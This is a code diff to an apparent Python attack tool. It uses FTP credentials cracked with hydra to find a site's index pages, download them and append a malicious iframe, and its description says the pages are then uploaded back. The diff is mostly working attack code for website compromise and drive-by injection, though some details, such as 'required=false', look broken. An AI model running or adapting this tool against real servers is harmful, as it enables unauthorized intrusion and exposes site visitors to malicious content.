@@ -15,9 +15,11 @@ import ipaddr
 import nmapxml
 from nmapxml import *
 import ftputil
+import ftplib
 
-parser = argparse.ArgumentParser(description='Run a short or verbose dirb scan')
+parser = argparse.ArgumentParser(description='Scan for FTP websites using creds discovered with hydra, search for index files append malicous code into it, then upload it back')
 parser.add_argument('-ip', action='store', required=True, help='IP Address to be assessed')
+parser.add_argument('-n', action='store_false', required=false, help='Inject malicious code')
 
 args = parser.parse_args()
 try:
@@ -36,6 +38,17 @@ def ftpLogin(ip_address, u, p):
         except OSError:
                 print "[-] %s - FTP using %s/%s is not allowed" % (ip_address, u, p)
                 pass 
+
+def injectPage(fname):
+	try:
+		print "Inserting code into %s" % fname
+		f = open(("%s" % fname), 'a')
+    		f.write(reconf.iframe1)	
+		f.close()
+	except Exception, e:
+		print e
+	finally:
+		pass
 
 fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
 try:
@@ -80,6 +93,12 @@ try:
 							print results
 						if re.search(r'^(index)[.](htm|html|asp|php)', fname):
 							print "[+] Found default page %s at %s" % (fname, root)
+							try:
+								print "Downloading %s with U %s P %s" % (fname, u, p)
+								ftp.download(("%s/%s" % (root, fname)), fname)
+								injectPage(fname)
+							except Exception, e:
+								print e
 except Exception, e: 
 	pass
 finally:
